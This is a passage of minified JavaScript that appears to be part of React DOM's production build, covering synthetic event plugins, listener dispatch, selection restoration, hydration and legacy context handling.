        deltaY: function (e) {
            return "deltaY" in e
                ? e.deltaY
                : "wheelDeltaY" in e
                  ? -e.wheelDeltaY
                  : "wheelDelta" in e
                    ? -e.wheelDelta
                    : 0;
        },
        deltaZ: 0,
        deltaMode: 0,
    }),
    t1 = ct(e1),
    n1 = [9, 13, 27, 32],
    lu = mn && "CompositionEvent" in window,
    Zo = null;
mn && "documentMode" in document && (Zo = document.documentMode);
var r1 = mn && "TextEvent" in window && !Zo,
    mm = mn && (!lu || (Zo && 8 < Zo && 11 >= Zo)),
    jd = " ",
    Rd = !1;
function hm(e, t) {
    switch (e) {
        case "keyup":
            return n1.indexOf(t.keyCode) !== -1;
        case "keydown":
            return t.keyCode !== 229;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1;
    }
}
function gm(e) {
    return (e = e.detail), typeof e == "object" && "data" in e ? e.data : null;
}
var $r = !1;
function o1(e, t) {
    switch (e) {
        case "compositionend":
            return gm(t);
        case "keypress":
            return t.which !== 32 ? null : ((Rd = !0), jd);
        case "textInput":
            return (e = t.data), e === jd && Rd ? null : e;
        default:
            return null;
    }
}
function i1(e, t) {
    if ($r)
        return e === "compositionend" || (!lu && hm(e, t)) ? ((e = fm()), (Ss = iu = Un = null), ($r = !1), e) : null;
    switch (e) {
        case "paste":
            return null;
        case "keypress":
            if (!(t.ctrlKey || t.altKey || t.metaKey) || (t.ctrlKey && t.altKey)) {
                if (t.char && 1 < t.char.length) return t.char;
                if (t.which) return String.fromCharCode(t.which);
            }
            return null;
        case "compositionend":
            return mm && t.locale !== "ko" ? null : t.data;
        default:
            return null;
    }
}
var s1 = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0,
};
function Md(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t === "input" ? !!s1[e.type] : t === "textarea";
}
function ym(e, t, n, r) {
    Qf(r),
        (t = Bs(t, "onChange")),
        0 < t.length && ((n = new su("onChange", "change", null, n, r)), e.push({ event: n, listeners: t }));
}
var Jo = null,
    fi = null;
function a1(e) {
    Tm(e, 0);
}
function xa(e) {
    var t = Kr(e);
    if (Uf(t)) return e;
}
function l1(e, t) {
    if (e === "change") return t;
}
var vm = !1;
if (mn) {
    var nl;
    if (mn) {
        var rl = "oninput" in document;
        if (!rl) {
            var Id = document.createElement("div");
            Id.setAttribute("oninput", "return;"), (rl = typeof Id.oninput == "function");
        }
        nl = rl;
    } else nl = !1;
    vm = nl && (!document.documentMode || 9 < document.documentMode);
}
function Ld() {
    Jo && (Jo.detachEvent("onpropertychange", xm), (fi = Jo = null));
}
function xm(e) {
    if (e.propertyName === "value" && xa(fi)) {
        var t = [];
        ym(t, fi, e, eu(e)), Zf(a1, t);
    }
}
function c1(e, t, n) {
    e === "focusin" ? (Ld(), (Jo = t), (fi = n), Jo.attachEvent("onpropertychange", xm)) : e === "focusout" && Ld();
}
function u1(e) {
    if (e === "selectionchange" || e === "keyup" || e === "keydown") return xa(fi);
}
function d1(e, t) {
    if (e === "click") return xa(t);
}
function p1(e, t) {
    if (e === "input" || e === "change") return xa(t);
}
function f1(e, t) {
    return (e === t && (e !== 0 || 1 / e === 1 / t)) || (e !== e && t !== t);
}
var Mt = typeof Object.is == "function" ? Object.is : f1;
function mi(e, t) {
    if (Mt(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var o = n[r];
        if (!Rl.call(t, o) || !Mt(e[o], t[o])) return !1;
    }
    return !0;
}
function Dd(e) {
    for (; e && e.firstChild; ) e = e.firstChild;
    return e;
}
function Od(e, t) {
    var n = Dd(e);
    e = 0;
    for (var r; n; ) {
        if (n.nodeType === 3) {
            if (((r = e + n.textContent.length), e <= t && r >= t)) return { node: n, offset: t - e };
            e = r;
        }
        e: {
            for (; n; ) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e;
                }
                n = n.parentNode;
            }
            n = void 0;
        }
        n = Dd(n);
    }
}
function wm(e, t) {
    return e && t
        ? e === t
            ? !0
            : e && e.nodeType === 3
              ? !1
              : t && t.nodeType === 3
                ? wm(e, t.parentNode)
                : "contains" in e
                  ? e.contains(t)
                  : e.compareDocumentPosition
                    ? !!(e.compareDocumentPosition(t) & 16)
                    : !1
        : !1;
}
function Sm() {
    for (var e = window, t = Is(); t instanceof e.HTMLIFrameElement; ) {
        try {
            var n = typeof t.contentWindow.location.href == "string";
        } catch {
            n = !1;
        }
        if (n) e = t.contentWindow;
        else break;
        t = Is(e.document);
    }
    return t;
}
function cu(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return (
        t &&
        ((t === "input" &&
            (e.type === "text" ||
                e.type === "search" ||
                e.type === "tel" ||
                e.type === "url" ||
                e.type === "password")) ||
            t === "textarea" ||
            e.contentEditable === "true")
    );
}
function m1(e) {
    var t = Sm(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && wm(n.ownerDocument.documentElement, n)) {
        if (r !== null && cu(n)) {
            if (((t = r.start), (e = r.end), e === void 0 && (e = t), "selectionStart" in n))
                (n.selectionStart = t), (n.selectionEnd = Math.min(e, n.value.length));
            else if (((e = ((t = n.ownerDocument || document) && t.defaultView) || window), e.getSelection)) {
                e = e.getSelection();
                var o = n.textContent.length,
                    i = Math.min(r.start, o);
                (r = r.end === void 0 ? i : Math.min(r.end, o)),
                    !e.extend && i > r && ((o = r), (r = i), (i = o)),
                    (o = Od(n, i));
                var s = Od(n, r);
                o &&
                    s &&
                    (e.rangeCount !== 1 ||
                        e.anchorNode !== o.node ||
                        e.anchorOffset !== o.offset ||
                        e.focusNode !== s.node ||
                        e.focusOffset !== s.offset) &&
                    ((t = t.createRange()),
                    t.setStart(o.node, o.offset),
                    e.removeAllRanges(),
                    i > r ? (e.addRange(t), e.extend(s.node, s.offset)) : (t.setEnd(s.node, s.offset), e.addRange(t)));
            }
        }
        for (t = [], e = n; (e = e.parentNode); )
            e.nodeType === 1 && t.push({ element: e, left: e.scrollLeft, top: e.scrollTop });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++)
            (e = t[n]), (e.element.scrollLeft = e.left), (e.element.scrollTop = e.top);
    }
}
var h1 = mn && "documentMode" in document && 11 >= document.documentMode,
    Vr = null,
    Xl = null,
    ei = null,
    Yl = !1;
function _d(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    Yl ||
        Vr == null ||
        Vr !== Is(r) ||
        ((r = Vr),
        "selectionStart" in r && cu(r)
            ? (r = { start: r.selectionStart, end: r.selectionEnd })
            : ((r = ((r.ownerDocument && r.ownerDocument.defaultView) || window).getSelection()),
              (r = {
                  anchorNode: r.anchorNode,
                  anchorOffset: r.anchorOffset,
                  focusNode: r.focusNode,
                  focusOffset: r.focusOffset,
              })),
        (ei && mi(ei, r)) ||
            ((ei = r),
            (r = Bs(Xl, "onSelect")),
            0 < r.length &&
                ((t = new su("onSelect", "select", null, t, n)), e.push({ event: t, listeners: r }), (t.target = Vr))));
}
function es(e, t) {
    var n = {};
    return (n[e.toLowerCase()] = t.toLowerCase()), (n["Webkit" + e] = "webkit" + t), (n["Moz" + e] = "moz" + t), n;
}
var Wr = {
        animationend: es("Animation", "AnimationEnd"),
        animationiteration: es("Animation", "AnimationIteration"),
        animationstart: es("Animation", "AnimationStart"),
        transitionend: es("Transition", "TransitionEnd"),
    },
    ol = {},
    bm = {};
mn &&
    ((bm = document.createElement("div").style),
    "AnimationEvent" in window ||
        (delete Wr.animationend.animation, delete Wr.animationiteration.animation, delete Wr.animationstart.animation),
    "TransitionEvent" in window || delete Wr.transitionend.transition);
function wa(e) {
    if (ol[e]) return ol[e];
    if (!Wr[e]) return e;
    var t = Wr[e],
        n;
    for (n in t) if (t.hasOwnProperty(n) && n in bm) return (ol[e] = t[n]);
    return e;
}
var km = wa("animationend"),
    Cm = wa("animationiteration"),
    Pm = wa("animationstart"),
    Em = wa("transitionend"),
    Nm = new Map(),
    Fd =
        "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
            " "
        );
function ir(e, t) {
    Nm.set(e, t), Rr(t, [e]);
}
for (var il = 0; il < Fd.length; il++) {
    var sl = Fd[il],
        g1 = sl.toLowerCase(),
        y1 = sl[0].toUpperCase() + sl.slice(1);
    ir(g1, "on" + y1);
}
ir(km, "onAnimationEnd");
ir(Cm, "onAnimationIteration");
ir(Pm, "onAnimationStart");
ir("dblclick", "onDoubleClick");
ir("focusin", "onFocus");
ir("focusout", "onBlur");
ir(Em, "onTransitionEnd");
yo("onMouseEnter", ["mouseout", "mouseover"]);
yo("onMouseLeave", ["mouseout", "mouseover"]);
yo("onPointerEnter", ["pointerout", "pointerover"]);
yo("onPointerLeave", ["pointerout", "pointerover"]);
Rr("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
Rr("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
Rr("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
Rr("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
Rr("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
Rr("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var qo =
        "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
            " "
        ),
    v1 = new Set("cancel close invalid load scroll toggle".split(" ").concat(qo));
function zd(e, t, n) {
    var r = e.type || "unknown-event";
    (e.currentTarget = n), g0(r, t, void 0, e), (e.currentTarget = null);
}
function Tm(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            o = r.event;
        r = r.listeners;
        e: {
            var i = void 0;
            if (t)
                for (var s = r.length - 1; 0 <= s; s--) {
                    var a = r[s],
                        c = a.instance,
                        u = a.currentTarget;
                    if (((a = a.listener), c !== i && o.isPropagationStopped())) break e;
                    zd(o, a, u), (i = c);
                }
            else
                for (s = 0; s < r.length; s++) {
                    if (
                        ((a = r[s]),
                        (c = a.instance),
                        (u = a.currentTarget),
                        (a = a.listener),
                        c !== i && o.isPropagationStopped())
                    )
                        break e;
                    zd(o, a, u), (i = c);
                }
        }
    }
    if (Ds) throw ((e = Kl), (Ds = !1), (Kl = null), e);
}
function le(e, t) {
    var n = t[nc];
    n === void 0 && (n = t[nc] = new Set());
    var r = e + "__bubble";
    n.has(r) || (Am(t, e, 2, !1), n.add(r));
}
function al(e, t, n) {
    var r = 0;
    t && (r |= 4), Am(n, e, r, t);
}
var ts = "_reactListening" + Math.random().toString(36).slice(2);
function hi(e) {
    if (!e[ts]) {
        (e[ts] = !0),
            Of.forEach(function (n) {
                n !== "selectionchange" && (v1.has(n) || al(n, !1, e), al(n, !0, e));
            });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[ts] || ((t[ts] = !0), al("selectionchange", !1, t));
    }
}
function Am(e, t, n, r) {
    switch (pm(t)) {
        case 1:
            var o = M0;
            break;
        case 4:
            o = I0;
            break;
        default:
            o = ou;
    }
    (n = o.bind(null, t, n, e)),
        (o = void 0),
        !Wl || (t !== "touchstart" && t !== "touchmove" && t !== "wheel") || (o = !0),
        r
            ? o !== void 0
                ? e.addEventListener(t, n, { capture: !0, passive: o })
                : e.addEventListener(t, n, !0)
            : o !== void 0
              ? e.addEventListener(t, n, { passive: o })
              : e.addEventListener(t, n, !1);
}
function ll(e, t, n, r, o) {
    var i = r;
    if (!(t & 1) && !(t & 2) && r !== null)
        e: for (;;) {
            if (r === null) return;
            var s = r.tag;
            if (s === 3 || s === 4) {
                var a = r.stateNode.containerInfo;
                if (a === o || (a.nodeType === 8 && a.parentNode === o)) break;
                if (s === 4)
                    for (s = r.return; s !== null; ) {
                        var c = s.tag;
                        if (
                            (c === 3 || c === 4) &&
                            ((c = s.stateNode.containerInfo), c === o || (c.nodeType === 8 && c.parentNode === o))
                        )
                            return;
                        s = s.return;
                    }
                for (; a !== null; ) {
                    if (((s = dr(a)), s === null)) return;
                    if (((c = s.tag), c === 5 || c === 6)) {
                        r = i = s;
                        continue e;
                    }
                    a = a.parentNode;
                }
            }
            r = r.return;
        }
    Zf(function () {
        var u = i,
            d = eu(n),
            p = [];
        e: {
            var m = Nm.get(e);
            if (m !== void 0) {
                var f = su,
                    S = e;
                switch (e) {
                    case "keypress":
                        if (bs(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        f = Q0;
                        break;
                    case "focusin":
                        (S = "focus"), (f = tl);
                        break;
                    case "focusout":
                        (S = "blur"), (f = tl);
                        break;
                    case "beforeblur":
                    case "afterblur":
                        f = tl;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        f = Nd;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        f = O0;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        f = Y0;
                        break;
                    case km:
                    case Cm:
                    case Pm:
                        f = z0;
                        break;
                    case Em:
                        f = J0;
                        break;
                    case "scroll":
                        f = L0;
                        break;
                    case "wheel":
                        f = t1;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        f = U0;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        f = Ad;
                }
                var y = (t & 4) !== 0,
                    w = !y && e === "scroll",
                    g = y ? (m !== null ? m + "Capture" : null) : m;
                y = [];
                for (var h = u, v; h !== null; ) {
                    v = h;
                    var b = v.stateNode;
                    if (
                        (v.tag === 5 &&
                            b !== null &&
                            ((v = b), g !== null && ((b = ci(h, g)), b != null && y.push(gi(h, b, v)))),
                        w)
                    )
                        break;
                    h = h.return;
                }
                0 < y.length && ((m = new f(m, S, null, n, d)), p.push({ event: m, listeners: y }));
            }
        }
        if (!(t & 7)) {
            e: {
                if (
                    ((m = e === "mouseover" || e === "pointerover"),
                    (f = e === "mouseout" || e === "pointerout"),
                    m && n !== $l && (S = n.relatedTarget || n.fromElement) && (dr(S) || S[hn]))
                )
                    break e;
                if (
                    (f || m) &&
                    ((m = d.window === d ? d : (m = d.ownerDocument) ? m.defaultView || m.parentWindow : window),
                    f
                        ? ((S = n.relatedTarget || n.toElement),
                          (f = u),
                          (S = S ? dr(S) : null),
                          S !== null && ((w = Mr(S)), S !== w || (S.tag !== 5 && S.tag !== 6)) && (S = null))
                        : ((f = null), (S = u)),
                    f !== S)
                ) {
                    if (
                        ((y = Nd),
                        (b = "onMouseLeave"),
                        (g = "onMouseEnter"),
                        (h = "mouse"),
                        (e === "pointerout" || e === "pointerover") &&
                            ((y = Ad), (b = "onPointerLeave"), (g = "onPointerEnter"), (h = "pointer")),
                        (w = f == null ? m : Kr(f)),
                        (v = S == null ? m : Kr(S)),
                        (m = new y(b, h + "leave", f, n, d)),
                        (m.target = w),
                        (m.relatedTarget = v),
                        (b = null),
                        dr(d) === u &&
                            ((y = new y(g, h + "enter", S, n, d)), (y.target = v), (y.relatedTarget = w), (b = y)),
                        (w = b),
                        f && S)
                    )
                        t: {
                            for (y = f, g = S, h = 0, v = y; v; v = Fr(v)) h++;
                            for (v = 0, b = g; b; b = Fr(b)) v++;
                            for (; 0 < h - v; ) (y = Fr(y)), h--;
                            for (; 0 < v - h; ) (g = Fr(g)), v--;
                            for (; h--; ) {
                                if (y === g || (g !== null && y === g.alternate)) break t;
                                (y = Fr(y)), (g = Fr(g));
                            }
                            y = null;
                        }
                    else y = null;
                    f !== null && Bd(p, m, f, y, !1), S !== null && w !== null && Bd(p, w, S, y, !0);
                }
            }
            e: {
                if (
                    ((m = u ? Kr(u) : window),
                    (f = m.nodeName && m.nodeName.toLowerCase()),
                    f === "select" || (f === "input" && m.type === "file"))
                )
                    var k = l1;
                else if (Md(m))
                    if (vm) k = p1;
                    else {
                        k = u1;
                        var C = c1;
                    }
                else
                    (f = m.nodeName) &&
                        f.toLowerCase() === "input" &&
                        (m.type === "checkbox" || m.type === "radio") &&
                        (k = d1);
                if (k && (k = k(e, u))) {
                    ym(p, k, n, d);
                    break e;
                }
                C && C(e, m, u),
                    e === "focusout" &&
                        (C = m._wrapperState) &&
                        C.controlled &&
                        m.type === "number" &&
                        Fl(m, "number", m.value);
            }
            switch (((C = u ? Kr(u) : window), e)) {
                case "focusin":
                    (Md(C) || C.contentEditable === "true") && ((Vr = C), (Xl = u), (ei = null));
                    break;
                case "focusout":
                    ei = Xl = Vr = null;
                    break;
                case "mousedown":
                    Yl = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    (Yl = !1), _d(p, n, d);
                    break;
                case "selectionchange":
                    if (h1) break;
                case "keydown":
                case "keyup":
                    _d(p, n, d);
            }
            var P;
            if (lu)
                e: {
                    switch (e) {
                        case "compositionstart":
                            var A = "onCompositionStart";
                            break e;
                        case "compositionend":
                            A = "onCompositionEnd";
                            break e;
                        case "compositionupdate":
                            A = "onCompositionUpdate";
                            break e;
                    }
                    A = void 0;
                }
            else
                $r
                    ? hm(e, n) && (A = "onCompositionEnd")
                    : e === "keydown" && n.keyCode === 229 && (A = "onCompositionStart");
            A &&
                (mm &&
                    n.locale !== "ko" &&
                    ($r || A !== "onCompositionStart"
                        ? A === "onCompositionEnd" && $r && (P = fm())
                        : ((Un = d), (iu = "value" in Un ? Un.value : Un.textContent), ($r = !0))),
                (C = Bs(u, A)),
                0 < C.length &&
                    ((A = new Td(A, e, null, n, d)),
                    p.push({ event: A, listeners: C }),
                    P ? (A.data = P) : ((P = gm(n)), P !== null && (A.data = P)))),
                (P = r1 ? o1(e, n) : i1(e, n)) &&
                    ((u = Bs(u, "onBeforeInput")),
                    0 < u.length &&
                        ((d = new Td("onBeforeInput", "beforeinput", null, n, d)),
                        p.push({ event: d, listeners: u }),
                        (d.data = P)));
        }
        Tm(p, t);
    });
}
function gi(e, t, n) {
    return { instance: e, listener: t, currentTarget: n };
}
function Bs(e, t) {
    for (var n = t + "Capture", r = []; e !== null; ) {
        var o = e,
            i = o.stateNode;
        o.tag === 5 &&
            i !== null &&
            ((o = i),
            (i = ci(e, n)),
            i != null && r.unshift(gi(e, i, o)),
            (i = ci(e, t)),
            i != null && r.push(gi(e, i, o))),
            (e = e.return);
    }
    return r;
}
function Fr(e) {
    if (e === null) return null;
    do e = e.return;
    while (e && e.tag !== 5);
    return e || null;
}
function Bd(e, t, n, r, o) {
    for (var i = t._reactName, s = []; n !== null && n !== r; ) {
        var a = n,
            c = a.alternate,
            u = a.stateNode;
        if (c !== null && c === r) break;
        a.tag === 5 &&
            u !== null &&
            ((a = u),
            o
                ? ((c = ci(n, i)), c != null && s.unshift(gi(n, c, a)))
                : o || ((c = ci(n, i)), c != null && s.push(gi(n, c, a)))),
            (n = n.return);
    }
    s.length !== 0 && e.push({ event: t, listeners: s });
}
var x1 = /\r\n?/g,
    w1 = /\u0000|\uFFFD/g;
function Ud(e) {
    return (typeof e == "string" ? e : "" + e)
        .replace(
            x1,
            `
`
        )
        .replace(w1, "");
}
function ns(e, t, n) {
    if (((t = Ud(t)), Ud(e) !== t && n)) throw Error(j(425));
}
function Us() {}
var Zl = null,
    Jl = null;
function ec(e, t) {
    return (
        e === "textarea" ||
        e === "noscript" ||
        typeof t.children == "string" ||
        typeof t.children == "number" ||
        (typeof t.dangerouslySetInnerHTML == "object" &&
            t.dangerouslySetInnerHTML !== null &&
            t.dangerouslySetInnerHTML.__html != null)
    );
}
var tc = typeof setTimeout == "function" ? setTimeout : void 0,
    S1 = typeof clearTimeout == "function" ? clearTimeout : void 0,
    Hd = typeof Promise == "function" ? Promise : void 0,
    b1 =
        typeof queueMicrotask == "function"
            ? queueMicrotask
            : typeof Hd < "u"
              ? function (e) {
                    return Hd.resolve(null).then(e).catch(k1);
                }
              : tc;
function k1(e) {
    setTimeout(function () {
        throw e;
    });
}
function cl(e, t) {
    var n = t,
        r = 0;
    do {
        var o = n.nextSibling;
        if ((e.removeChild(n), o && o.nodeType === 8))
            if (((n = o.data), n === "/$")) {
                if (r === 0) {
                    e.removeChild(o), pi(t);
                    return;
                }
                r--;
            } else (n !== "$" && n !== "$?" && n !== "$!") || r++;
        n = o;
    } while (n);
    pi(t);
}
function Gn(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (((t = e.data), t === "$" || t === "$!" || t === "$?")) break;
            if (t === "/$") return null;
        }
    }
    return e;
}
function $d(e) {
    e = e.previousSibling;
    for (var t = 0; e; ) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--;
            } else n === "/$" && t++;
        }
        e = e.previousSibling;
    }
    return null;
}
var To = Math.random().toString(36).slice(2),
    Wt = "__reactFiber$" + To,
    yi = "__reactProps$" + To,
    hn = "__reactContainer$" + To,
    nc = "__reactEvents$" + To,
    C1 = "__reactListeners$" + To,
    P1 = "__reactHandles$" + To;
function dr(e) {
    var t = e[Wt];
    if (t) return t;
    for (var n = e.parentNode; n; ) {
        if ((t = n[hn] || n[Wt])) {
            if (((n = t.alternate), t.child !== null || (n !== null && n.child !== null)))
                for (e = $d(e); e !== null; ) {
                    if ((n = e[Wt])) return n;
                    e = $d(e);
                }
            return t;
        }
        (e = n), (n = e.parentNode);
    }
    return null;
}
function Di(e) {
    return (e = e[Wt] || e[hn]), !e || (e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3) ? null : e;
}
function Kr(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(j(33));
}
function Sa(e) {
    return e[yi] || null;
}
var rc = [],
    Gr = -1;
function sr(e) {
    return { current: e };
}
function ce(e) {
    0 > Gr || ((e.current = rc[Gr]), (rc[Gr] = null), Gr--);
}
function se(e, t) {
    Gr++, (rc[Gr] = e.current), (e.current = t);
}
var er = {},
    Be = sr(er),
    Ye = sr(!1),
    kr = er;
function vo(e, t) {
    var n = e.type.contextTypes;
    if (!n) return er;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var o = {},
        i;
    for (i in n) o[i] = t[i];
    return (
        r &&
            ((e = e.stateNode),
            (e.__reactInternalMemoizedUnmaskedChildContext = t),
            (e.__reactInternalMemoizedMaskedChildContext = o)),
        o
    );
}
function Ze(e) {
    return (e = e.childContextTypes), e != null;
}
function Hs() {
    ce(Ye), ce(Be);
}
function Vd(e, t, n) {
    if (Be.current !== er) throw Error(j(168));
    se(Be, t), se(Ye, n);
}
function jm(e, t, n) {
    var r = e.stateNode;
    if (((t = t.childContextTypes), typeof r.getChildContext != "function")) return n;
    r = r.getChildContext();
    for (var o in r) if (!(o in t)) throw Error(j(108, c0(e) || "Unknown", o));
    return me({}, n, r);
}
function $s(e) {
    return (
        (e = ((e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext) || er),
        (kr = Be.current),
        se(Be, e),
        se(Ye, Ye.current),
        !0
    );
}
function Wd(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(j(169));
    n ? ((e = jm(e, t, kr)), (r.__reactInternalMemoizedMergedChildContext = e), ce(Ye), ce(Be), se(Be, e)) : ce(Ye),
        se(Ye, n);
}
var ln = null,
    ba = !1,
    ul = !1;
function Rm(e) {
    ln === null ? (ln = [e]) : ln.push(e);
}
function E1(e) {
    (ba = !0), Rm(e);
}
function ar() {
    if (!ul && ln !== null) {
        ul = !0;
        var e = 0,
            t = oe;
        try {
            var n = ln;
            for (oe = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0);
                while (r !== null);
            }
            (ln = null), (ba = !1);
        } catch (o) {
            throw (ln !== null && (ln = ln.slice(e + 1)), nm(tu, ar), o);
        } finally {
            (oe = t), (ul = !1);
        }
    }
    return null;
}
var Qr = [],
    qr = 0,
    Vs = null,
    Ws = 0,
    ft = [],
    mt = 0,
    Cr = null,
    un = 1,
    dn = "";
function cr(e, t) {
    (Qr[qr++] = Ws), (Qr[qr++] = Vs), (Vs = e), (Ws = t);
}
function Mm(e, t, n) {
    (ft[mt++] = un), (ft[mt++] = dn), (ft[mt++] = Cr), (Cr = e);
    var r = un;
    e = dn;
    var o = 32 - jt(r) - 1;
    (r &= ~(1 << o)), (n += 1);
    var i = 32 - jt(t) + o;
    if (30 < i) {
        var s = o - (o % 5);
        (i = (r & ((1 << s) - 1)).toString(32)),
            (r >>= s),
            (o -= s),
            (un = (1 << (32 - jt(t) + o)) | (n << o) | r),
            (dn = i + e);
    } else (un = (1 << i) | (n << o) | r), (dn = e);
}
function uu(e) {
    e.return !== null && (cr(e, 1), Mm(e, 1, 0));
}
function du(e) {
    for (; e === Vs; ) (Vs = Qr[--qr]), (Qr[qr] = null), (Ws = Qr[--qr]), (Qr[qr] = null);
    for (; e === Cr; )
        (Cr = ft[--mt]), (ft[mt] = null), (dn = ft[--mt]), (ft[mt] = null), (un = ft[--mt]), (ft[mt] = null);
}
var it = null,
    ot = null,
    de = !1,
    At = null;
function Im(e, t) {
    var n = ht(5, null, null, 0);
    (n.elementType = "DELETED"),
        (n.stateNode = t),
        (n.return = e),
        (t = e.deletions),
        t === null ? ((e.deletions = [n]), (e.flags |= 16)) : t.push(n);
}
function Kd(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return (
                (t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t),
                t !== null ? ((e.stateNode = t), (it = e), (ot = Gn(t.firstChild)), !0) : !1
            );
        case 6:
            return (
                (t = e.pendingProps === "" || t.nodeType !== 3 ? null : t),
                t !== null ? ((e.stateNode = t), (it = e), (ot = null), !0) : !1
            );
        case 13:
            return (
                (t = t.nodeType !== 8 ? null : t),
                t !== null
                    ? ((n = Cr !== null ? { id: un, overflow: dn } : null),
                      (e.memoizedState = { dehydrated: t, treeContext: n, retryLane: 1073741824 }),
                      (n = ht(18, null, null, 0)),
                      (n.stateNode = t),
                      (n.return = e),
                      (e.child = n),
                      (it = e),
                      (ot = null),
                      !0)
                    : !1
            );
        default:
            return !1;
    }
}
function oc(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0;
}
function ic(e) {
    if (de) {
        var t = ot;
        if (t) {
            var n = t;
            if (!Kd(e, t)) {
                if (oc(e)) throw Error(j(418));
                t = Gn(n.nextSibling);
                var r = it;
                t && Kd(e, t) ? Im(r, n) : ((e.flags = (e.flags & -4097) | 2), (de = !1), (it = e));
            }
        } else {
            if (oc(e)) throw Error(j(418));
            (e.flags = (e.flags & -4097) | 2), (de = !1), (it = e);
        }
    }
}
function Gd(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13; ) e = e.return;
    it = e;
}
function rs(e) {
    if (e !== it) return !1;
    if (!de) return Gd(e), (de = !0), !1;
    var t;
    if (
        ((t = e.tag !== 3) &&
            !(t = e.tag !== 5) &&
            ((t = e.type), (t = t !== "head" && t !== "body" && !ec(e.type, e.memoizedProps))),
        t && (t = ot))
    ) {
        if (oc(e)) throw (Lm(), Error(j(418)));
        for (; t; ) Im(e, t), (t = Gn(t.nextSibling));
    }
    if ((Gd(e), e.tag === 13)) {
        if (((e = e.memoizedState), (e = e !== null ? e.dehydrated : null), !e)) throw Error(j(317));
        e: {
            for (e = e.nextSibling, t = 0; e; ) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            ot = Gn(e.nextSibling);
                            break e;
                        }
                        t--;
                    } else (n !== "$" && n !== "$!" && n !== "$?") || t++;
                }
                e = e.nextSibling;
            }
            ot = null;
        }
    } else ot = it ? Gn(e.stateNode.nextSibling) : null;
    return !0;
}
function Lm() {
    for (var e = ot; e; ) e = Gn(e.nextSibling);
}
function xo() {
    (ot = it = null), (de = !1);
}
function pu(e) {
    At === null ? (At = [e]) : At.push(e);
}
var N1 = wn.ReactCurrentBatchConfig;
function Bo(e, t, n) {
    if (((e = n.ref), e !== null && typeof e != "function" && typeof e != "object")) {
        if (n._owner) {
            if (((n = n._owner), n)) {
                if (n.tag !== 1) throw Error(j(309));
                var r = n.stateNode;
            }
            if (!r) throw Error(j(147, e));
            var o = r,
                i = "" + e;
            return t !== null && t.ref !== null && typeof t.ref == "function" && t.ref._stringRef === i
                ? t.ref
                : ((t = function (s) {
                      var a = o.refs;
                      s === null ? delete a[i] : (a[i] = s);
                  }),
                  (t._stringRef = i),
                  t);
        }
        if (typeof e != "string") throw Error(j(284));
        if (!n._owner) throw Error(j(290, e));
    }
    return e;
}
